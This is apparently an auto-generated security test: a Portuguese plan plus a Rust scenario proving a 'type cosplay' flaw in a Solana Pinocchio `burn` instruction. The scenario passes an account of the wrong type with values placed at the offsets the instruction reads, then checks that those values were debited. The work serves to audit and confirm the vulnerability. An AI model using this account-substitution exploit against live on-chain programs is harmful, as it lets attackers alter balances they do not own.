{
  "plan": "O programa `burn` (Pinocchio) le supply/balance diretamente dos offsets 40..48 e 48..56 do buffer da conta `ledger`, sem verificar discriminador de tipo. O baseline usa uma conta do tipo esperado (Ledger) com supply=1000 e balance=500, e queima 100 com sucesso. O ataque fornece uma conta de tipo diferente (ex.: Config) cujo layout coloca valores nos mesmos offsets, e a instrucao aceita e debita esses valores, provando o COSPLAY. O efeito mede que os bytes 40..56 da conta de tipo diferente foram alterados pela instrucao, algo que o uso legitimo nao faria nessa conta.",
  "scenario": "let ledger_key = Pubkey::new_unique();
let attacker_key = Pubkey::new_unique();

// Conta legitima do tipo esperado: supply em 40..48, balance em 48..56
let mut legit_data = vec![0u8; 64];
legit_data[40..48].copy_from_slice(&1000u64.to_le_bytes());
legit_data[48..56].copy_from_slice(&500u64.to_le_bytes());
let legit_account = account(&env.program_id, &legit_data, None);

// Conta de tipo diferente (COSPLAY): mesmo layout nos offsets 40..56, mas dados de outro tipo
let mut cosplay_data = vec![0u8; 64];
// discriminador de outro tipo nos primeiros 8 bytes
cosplay_data[0..8].copy_from_slice(&[0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x11, 0x22]);
cosplay_data[40..48].copy_from_slice(&777u64.to_le_bytes());
cosplay_data[48..56].copy_from_slice(&333u64.to_le_bytes());
let cosplay_account = account(&env.program_id, &cosplay_data, None);

// Instrucao burn: byte 3 + amount u64 LE
let mut ix_data = vec![3u8];
ix_data.extend_from_slice(&100u64.to_le_bytes());

// Baseline: queima 100 da conta legitima
let baseline_ix = env.raw_ix(&ix_data, &[AccountMeta::new(ledger_key, false)]);
let baseline_accounts = vec![(ledger_key, legit_account.clone())];
let baseline_result = env.baseline("burn legitimo", &baseline_ix, &baseline_accounts);

// Ataque: mesma instrucao, mas com conta de tipo diferente
let attack_ix = env.raw_ix(&ix_data, &[AccountMeta::new(attacker_key, false)]);
let attack_accounts = vec![(attacker_key, cosplay_account.clone())];
let attack_result = env.attack("burn com conta de tipo diferente (COSPLAY)", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let after_data = after(&attack_result, &attacker_key).data();
    let new_supply = read_u64(after_data, 40);
    let new_balance = read_u64(after_data, 48);
    // O ataque bem-sucedido alterou os offsets 40..56 da conta de tipo diferente
    env.effect("supply da conta de tipo diferente foi debitado", new_supply == 677);
    env.effect("balance da conta de tipo diferente foi debitado", new_balance == 233);
}"
}

